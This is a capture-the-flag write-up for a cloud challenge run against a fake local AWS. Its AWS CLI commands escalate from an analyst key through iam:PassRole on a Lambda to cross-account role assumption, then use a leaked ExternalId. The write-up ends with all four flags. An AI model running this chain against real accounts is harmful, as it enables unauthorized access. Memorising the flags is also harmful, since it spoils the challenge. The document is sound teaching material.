# Deputy

**Category:** cloud  **Difficulty:** hard  **Author:** abu

> DeputyCorp is a cloud deployment partner your company integrated with. You've been handed a low-privilege analyst key into their account. Find out how far a careless integration really lets you go.
>
> Four flags, deeper each stage.
>
> Endpoint: `http://<your-instance-host>:<port>`
>
> `aws_access_key_id = AKIAANALYST0000000000`
> `aws_secret_access_key = wJalrAnalystSecretKeyEXAMPLEbPxRfiCY`
> `region = us-east-1`

Run: `docker build -t deputy challenge/ && docker run -p 8080:8080 deputy`. It's a small fake AWS (IAM, STS, Lambda, S3) that you drive with the real AWS CLI. Two accounts: `111111111111` is ours, `999999999999` is DeputyCorp.

## Solution

```sh
EP="--endpoint-url http://<host>:<port>"
export AWS_DEFAULT_REGION=us-east-1 AWS_ACCESS_KEY_ID=AKIAANALYST0000000000 AWS_SECRET_ACCESS_KEY=x
aws configure set default.s3.addressing_style path
```

Signatures aren't checked, only the key id, so the secret can be anything.

**Recon.** Look at who we are and what we can do:

```sh
aws $EP sts get-caller-identity
aws $EP s3api list-buckets
aws $EP iam get-user-policy --user-name analyst --policy-name analyst-permissions
aws $EP s3api get-object --bucket deputy-analyst-scratch --key welcome.txt /dev/stdout
```

The analyst can create and invoke Lambdas and has `iam:PassRole`, but only on `ci-runner-role`. That role's policy lets it assume `arn:aws:iam::999999999999:role/partner-admin-role`.

**PassRole.** Create a function with `ci-runner-role` as its execution role and invoke it. The code doesn't matter (any zip works); the response hands back the role's credentials.

```sh
aws $EP lambda create-function --function-name pwn --runtime python3.12 \
  --role arn:aws:iam::111111111111:role/ci-runner-role --handler index.handler --zip-file fileb://f.zip
aws $EP lambda invoke --function-name pwn out.json; cat out.json
aws $EP s3api get-object --bucket deputy-runner-logs --key build.log /dev/stdout
```

**Admin.** `partner-admin-role` trusts our whole account root and has no ExternalId condition. That's the careless integration.

```sh
aws $EP sts assume-role --role-arn arn:aws:iam::999999999999:role/partner-admin-role --role-session-name admin
aws $EP s3api get-object --bucket deputy-flag-vault --key flag /dev/stdout
aws $EP s3api get-object --bucket deputy-flag-vault --key partner-config.json /dev/stdout
```

**ExternalId.** `partner-config.json` leaks the ExternalId for `partner-secure-role`, the one role they did set up properly. Without it (or with a wrong one) the assume is denied, and you can't see the partner account's roles from recon, so this is the only way to get it.

```sh
aws $EP sts assume-role --role-arn arn:aws:iam::999999999999:role/partner-secure-role \
  --role-session-name crown --external-id Dc-2026-8f31a97c4b2e
aws $EP s3api get-object --bucket deputy-crown-vault --key flag /dev/stdout
```

Flags: `H7CTF{d6cc592f5a2f3db80718}`, `H7CTF{28f87391f8a228110839}`, `H7CTF{ea3e1dba8012d76e2648}`, `H7CTF{1dbe909840d15aabdd63}`
